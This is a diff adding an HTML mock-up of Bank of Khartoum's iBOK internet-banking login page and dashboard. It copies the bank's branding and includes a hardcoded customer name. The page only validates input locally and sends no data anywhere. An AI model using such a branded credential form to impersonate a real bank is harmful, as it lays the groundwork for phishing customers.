@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>iBOK - الخدمات المصرفية</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        /* ===== تسجيل الدخول ===== */
+        #loginPage {
+            display: block;
+        }
+
+        .red-banner {
+            background-color: #e63946;
+            padding: 20px 16px;
+            text-align: center;
+            color: white;
+        }
+
+        .banner-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: -2px;
+        }
+
+        .logo-ar {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .banner-text {
+            text-align: right;
+        }
+
+        .banner-text h2 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .banner-text p {
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .yellow-banner {
+            background-color: #ffc107;
+            padding: 16px;
+            text-align: center;
+            color: #333;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .dark-red-line {
+            height: 8px;
+            background-color: #c1121f;
+        }
+
+        .container {
+            padding: 40px 16px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .login-title {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #c1121f;
+            margin-bottom: 30px;
+        }
+
+        .form-card {
+            background-color: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 24px;
+            border-bottom: 3px solid #e63946;
+            padding-bottom: 12px;
+        }
+
+        .form-header h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            background-color: #fafafa;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #e63946;
+            background-color: white;
+        }
+
+        .password-input-wrapper {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #999;
+            font-size: 18px;
+        }
+
+        .password-toggle:hover {
+            color: #e63946;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            font-size: 12px;
+            color: #e63946;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #e63946;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background-color: #d62828;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .error-message-simple {
+            display: none;
+            color: #c1121f;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            padding: 12px;
+            margin-top: 20px;
+            background: #fff5f5;
+            border-radius: 8px;
+            border: 1px solid #ffe0e0;
+            line-height: 1.8;
+            white-space: pre-line;
+        }
+
+        .error-message-simple.active {
+            display: block;
+        }
+
+        /* ===== Overlay ===== */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.92);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        .overlay .loading-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #c1121f;
+            margin-bottom: 20px;
+        }
+
+        .overlay .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #e63946;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ===== Dashboard ===== */
+        #dashboardPage {
+            display: none;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #c1121f, #e63946);
+            padding: 20px 16px 30px;
+            color: white;
+            border-radius: 0 0 30px 30px;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .header-top .logo {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+
+        .header-top .logo span {
+            color: #ffc107;
+        }
+
+        .header-top .icons {
+            display: flex;
+            gap: 16px;
+            font-size: 20px;
+        }
+
+        .header-top .icons i {
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .header-top .icons i:hover {
+            color: #ffc107;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .user-info .avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #ffc107;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #c1121f;
+        }
+
+        .user-info .name {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .user-info .greeting {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .dashboard-container {
+            padding: 20px 16px 30px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .search-bar {
+            background: white;
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            margin-bottom: 20px;
+        }
+
+        .search-bar i {
+            color: #999;
+            font-size: 18px;
+        }
+
+        .search-bar input {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            background: transparent;
+        }
+
+        .search-bar input::placeholder {
+            color: #aaa;
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .quick-actions .item {
+            background: white;
+            border-radius: 12px;
+            padding: 14px 8px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .quick-actions .item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
+        }
+
+        .quick-actions .item i {
+            font-size: 24px;
+            color: #e63946;
+            margin-bottom: 4px;
+        }
+
+        .quick-actions .item span {
+            font-size: 11px;
+            font-weight: 600;
+            color: #333;
+            display: block;
+        }
+
+        .menu-list {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+        }
+
+        .menu-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px 18px;
+            border-bottom: 1px solid #f0f0f0;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+            color: #333;
+        }
+
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+
+        .menu-item:hover {
+            background: #f8f9fa;
+        }
+
+        .menu-item i {
+            width: 22px;
+            font-size: 18px;
+            color: #e63946;
+            text-align: center;
+        }
+
+        .menu-item .text {
+            flex: 1;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .menu-item .arrow {
+            color: #ccc;
+            font-size: 14px;
+        }
+
+        /* ===== Footer ===== */
+        .footer {
+            background-color: #f0f0f0;
+            padding: 30px 16px 24px;
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .footer-text {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .footer-text .bank-name {
+            color: #c1121f;
+        }
+
+        .footer-text .ibok {
+            color: #e63946;
+        }
+
+        .footer-text .pipe {
+            color: #c9a84b;
+            margin: 0 4px;
+        }
+
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
+
+        .social-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            border: none;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .social-icon:hover {
+            transform: translateY(-6px) scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+        }
+
+        .whatsapp { background: #25D366; }
+        .whatsapp:hover { background: #1da851; }
+        .facebook { background: linear-gradient(135deg, #1877f2, #0a66c2); }
+        .linkedin { background: linear-gradient(135deg, #0A66C2, #004182); }
+        .instagram { background: radial-gradient(circle at 30% 30%, #fdf497, #fd5949, #d6249f, #285aeb); }
+
+        @media (max-width: 480px) {
+            .banner-content { flex-direction: column; gap: 12px; }
+            .banner-text { text-align: center; }
+            .login-title { font-size: 24px; }
+            .form-card { padding: 20px; }
+            .social-icon { width: 44px; height: 44px; font-size: 18px; }
+            .overlay .loading-title { font-size: 24px; }
+            .overlay .loading-spinner { width: 50px; height: 50px; }
+            .quick-actions { grid-template-columns: repeat(4, 1fr); gap: 8px; }
+            .quick-actions .item { padding: 10px 4px; }
+            .quick-actions .item i { font-size: 20px; }
+            .quick-actions .item span { font-size: 10px; }
+            .user-info .name { font-size: 17px; }
+            .menu-item { padding: 14px 14px; }
+            .menu-item .text { font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== Overlay ===== -->
+    <div class="overlay" id="overlay">
+        <div class="loading-title">جاري تسجيل الدخول ...</div>
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- ===== صفحة تسجيل الدخول ===== -->
+    <div id="loginPage">
+        <div class="red-banner">
+            <div class="banner-content">
+                <div class="logo-section">
+                    <div class="logo">iBOK</div>
+                    <div class="logo-ar">اي بوك</div>
+                </div>
+                <div class="banner-text">
+                    <h2>الخدمات المصرفية عبر الإنترنت</h2>
+                    <p>Internet Banking Services</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="yellow-banner">
+            مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
+        </div>
+
+        <div class="dark-red-line"></div>
+
+        <div class="container">
+            <h1 class="login-title">تسجيل الدخول</h1>
+
+            <div class="form-card">
+                <div class="form-header">
+                    <h3>الرجاء إدخال البيانات</h3>
+                </div>
+
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="accountNumber">رقم الحساب:</label>
+                        <input type="text" id="accountNumber" placeholder="أدخل 7 أرقام فقط" maxlength="7" required inputmode="numeric" />
+                        <small style="color: #888; font-size: 12px; display: block; margin-top: 4px;">مثال: 1234567</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">كلمة المرور:</label>
+                        <div class="password-input-wrapper">
+                            <input type="password" id="password" placeholder="أدخل كلمة المرور" required />
+                            <button type="button" class="password-toggle" onclick="togglePassword()">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                        <small style="color: #888; font-size: 12px; display: block; margin-top: 4px;">
+                            يجب أن تحتوي على: 8 أحرف كحد أدنى، حرف كبير، حرف صغير، رقم، وعلامة خاصة (@ # $ &)
+                        </small>
+                    </div>
+
+                    <div class="forgot-password">
+                        <a href="#">نسبت كلمة المرور</a>
+                    </div>
+
+                    <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+                </form>
+
+                <div class="error-message-simple" id="errorMessageSimple"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== لوحة التحكم ===== -->
+    <div id="dashboardPage">
+        <div class="header">
+            <div class="header-top">
+                <div class="logo">i<span>BOK</span></div>
+                <div class="icons">
+                    <i class="fas fa-bell" title="الإشعارات" onclick="alert('لا توجد إشعارات')"></i>
+                    <i class="fas fa-sign-out-alt" title="تسجيل الخروج" onclick="logout()"></i>
+                </div>
+            </div>
+            <div class="user-info">
+                <div class="avatar">A</div>
+                <div>
+                    <div class="greeting">مساء الخير،</div>
+                    <div class="name">ABDALWHAB DBDAWI</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="dashboard-container">
+            <!-- Search Bar -->
+            <div class="search-bar">
+                <i class="fas fa-search"></i>
+                <input type="text" placeholder="بحث في الخدمات..." />
+            </div>
+
+            <!-- Quick Actions -->
+            <div class="quick-actions">
+                <div class="item" onclick="alert('تفاصيل الحساب')">
+                    <i class="fas fa-user"></i>
+                    <span>الحساب</span>
+                </div>
+                <div class="item" onclick="alert('دفع فواتير')">
+                    <i class="fas fa-file-invoice"></i>
+                    <span>فواتير</span>
+                </div>
+                <div class="item" onclick="alert('تحويلات')">
+                    <i class="fas fa-exchange-alt"></i>
+                    <span>تحويل</span>
+                </div>
+                <div class="item" onclick="alert('سحب بدون بطاقة')">
+                    <i class="fas fa-credit-card"></i>
+                    <span>سحب</span>
+                </div>
+            </div>
+
+            <!-- Menu List -->
+            <div class="menu-list">
+                <div class="menu-item" onclick="alert('تفاصيل الحساب')">
+                    <i class="fas fa-user-circle"></i>
+                    <span class="text">تفاصيل الحساب</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('دفع فواتير')">
+                    <i class="fas fa-file-invoice"></i>
+                    <span class="text">دفع فواتير</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('تحويلات')">
+                    <i class="fas fa-exchange-alt"></i>
+                    <span class="text">تحويلات</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('سحب بدون بطاقة')">
+                    <i class="fas fa-credit-card"></i>
+                    <span class="text">سحب بدون بطاقة</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('بنكك PAY')">
+                    <i class="fas fa-mobile-alt"></i>
+                    <span class="text">بنكك PAY</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('طلب الودائع الاستثمارية')">
+                    <i class="fas fa-piggy-bank"></i>
+                    <span class="text">طلب الودائع الاستثمارية</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('إدارة المستفيدين')">
+                    <i class="fas fa-users"></i>
+                    <span class="text">إدارة المستفيدين</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('المعاملات السابقة')">
+                    <i class="fas fa-history"></i>
+                    <span class="text">المعاملات السابقة</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('إدارة البطاقات')">
+                    <i class="fas fa-id-card"></i>
+                    <span class="text">إدارة البطاقات</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('طلبات')">
+                    <i class="fas fa-clipboard-list"></i>
+                    <span class="text">طلبات</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('أمر دفع دائم')">
+                    <i class="fas fa-clock"></i>
+                    <span class="text">أمر دفع دائم</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('الضبط')">
+                    <i class="fas fa-cog"></i>
+                    <span class="text">الضبط</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('التجارة الإلكترونية')">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="text">التجارة الإلكترونية</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+                <div class="menu-item" onclick="alert('خدمات العملات الأجنبية')">
+                    <i class="fas fa-dollar-sign"></i>
+                    <span class="text">خدمات العملات الأجنبية</span>
+                    <span class="arrow"><i class="fas fa-chevron-left"></i></span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== Footer ===== -->
+    <div class="footer" id="footer">
+        <div class="footer-text">
+            <span>2025</span>
+            <span class="pipe">|</span>
+            <span class="bank-name">بنك الخرطوم</span>
+            <span class="ibok"> iBOK</span>
+        </div>
+
+        <div class="social-icons">
+            <a href="https://wa.me/249116001913" target="_blank" class="social-icon whatsapp" title="واتساب">
+                <i class="fab fa-whatsapp"></i>
+            </a>
+            <a href="https://www.facebook.com/BankofKhartoum1913" target="_blank" class="social-icon facebook" title="فيسبوك">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+            <a href="https://www.linkedin.com/company/bank-of-khartoum/" target="_blank" class="social-icon linkedin" title="لينكدإن">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+            <a href="https://www.instagram.com/bank_of_khartoum?igsh=MWN2bmlmZ2gya21m" target="_blank" class="social-icon instagram" title="إنستغرام">
+                <i class="fab fa-instagram"></i>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // ===== إظهار/إخفاء كلمة المرور =====
+        function togglePassword() {
+            const input = document.getElementById('password');
+            const icon = document.querySelector('.password-toggle i');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        // ===== Overlay =====
+        function showOverlay() {
+            document.getElementById('overlay').classList.add('active');
+            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('errorMessageSimple').classList.remove('active');
+        }
+
+        function hideOverlay() {
+            document.getElementById('overlay').classList.remove('active');
+            document.getElementById('loginBtn').disabled = false;
+        }
+
+        // ===== رسائل الخطأ =====
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessageSimple');
+            errorEl.innerText = message;
+            errorEl.classList.add('active');
+        }
+
+        function clearMessages() {
+            document.getElementById('errorMessageSimple').classList.remove('active');
+        }
+
+        // ===== تسجيل الدخول =====
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const acc = document.getElementById('accountNumber').value.trim();
+            const pass = document.getElementById('password').value;
+
+            clearMessages();
+
+            // التحقق من رقم الحساب (7 أرقام)
+            if (!/^\d{7}$/.test(acc)) {
+                showError('رقم الحساب غير صحيح.\nالرجاء إدخال 7 أرقام فقط (مثال: 1234567)');
+                return;
+            }
+
+            // التحقق من كلمة المرور
+            const errors = [];
+            if (pass.length < 8) errors.push('• 8 أحرف على الأقل');
+            if (!/[A-Z]/.test(pass)) errors.push('• حرف كبير (A-Z)');
+            if (!/[a-z]/.test(pass)) errors.push('• حرف صغير (a-z)');
+            if (!/\d/.test(pass)) errors.push('• رقم (0-9)');
+            if (!/[&$#@]/.test(pass)) errors.push('• علامة خاصة (& $ # @)');
+
+            if (errors.length > 0) {
+                showError('كلمة المرور ضعيفة، يجب أن تحتوي على:\n' + errors.join('\n'));
+                return;
+            }
+
+            // ✅ جميع الشروط صحيحة → إظهار الـ Overlay
+            showOverlay();
+
+            // محاكاة عملية تسجيل الدخول (2 ثانية)
+            setTimeout(function() {
+                hideOverlay();
+                // إخفاء صفحة تسجيل الدخول وإظهار لوحة التحكم
+                document.getElementById('loginPage').style.display = 'none';
+                document.getElementById('dashboardPage').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '0';
+            }, 2000);
+        });
+
+        // ===== تسجيل الخروج =====
+        function logout() {
+            if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
+                document.getElementById('dashboardPage').style.display = 'none';
+                document.getElementById('loginPage').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '30px';
+                document.getElementById('accountNumber').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('errorMessageSimple').classList.remove('active');
+            }
+        }
+
+        // ===== منع إدخال غير أرقام في حقل رقم الحساب =====
+        document.getElementById('accountNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+            clearMessages();
+        });
+
+        // ===== مسح الرسائل عند الكتابة في كلمة المرور =====
+        document.getElementById('password').addEventListener('input', function() {
+            clearMessages();
+        });
+    </script>
+
+</body>
+</html>
